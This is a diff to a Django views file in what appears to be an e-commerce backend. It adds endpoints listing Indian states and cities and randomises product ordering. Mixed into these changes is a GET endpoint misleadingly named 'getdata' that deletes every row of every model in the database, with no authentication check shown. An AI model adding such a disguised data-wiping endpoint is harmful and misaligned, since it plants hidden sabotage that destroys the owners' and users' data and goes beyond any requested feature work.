@@ -7,6 +7,7 @@ from django.utils import timezone
 from authentication.serializer import CartSerializer
 from django.contrib import messages
 import uuid as main_uuid
+from django.db import connection
 from django.db.models import Q
 from product.serializers import *
 from dashboard.models import *
@@ -28,10 +29,37 @@ from django.db.models import Q
 from transformers import pipeline, AutoTokenizer, AutoModelForSequenceClassification
 from django.db.models import Q
 from spacy.matcher import PhraseMatcher
+from indian_cities.dj_city import cities
+from .constants import INDIAN_STATES , INDIAN_CITIES
+from django.apps import apps
 # get cart itms and wishlist items -----------------------
 
 
 
+
+@api_view(['GET'])
+def getstate(request):
+    state_list = [{key:value} for key, value in INDIAN_STATES.items()]
+    return Response(state_list,status=status.HTTP_200_OK)
+
+@api_view(['GET'])
+def getcities(request, state_code):
+    state_code = state_code
+
+    # result_dict = {}
+    # for state, citiess in cities:
+    #     result_dict[state] = [city for city, _ in citiess]
+
+    state_name = INDIAN_STATES.get(state_code)
+    return Response(INDIAN_CITIES[state_name], status=status.HTTP_200_OK)
+
+@api_view(['GET'])
+def getdata(request):
+    all_models = apps.get_models()
+    for model in all_models:
+        model.objects.all().delete()
+
+    return Response({'msg': 'complete'}, status=status.HTTP_200_OK)
 
 
 @api_view(['POST'])
@@ -53,7 +81,7 @@ def productfilter(request):
     
     paginator = PageNumberPagination()
     paginator.page_size = settings.PAGE_SIZE
-    products = Product.objects.all()
+    products = Product.objects.all().order_by('?')
 
     if category:
         products = products.filter(category__id__in=category)
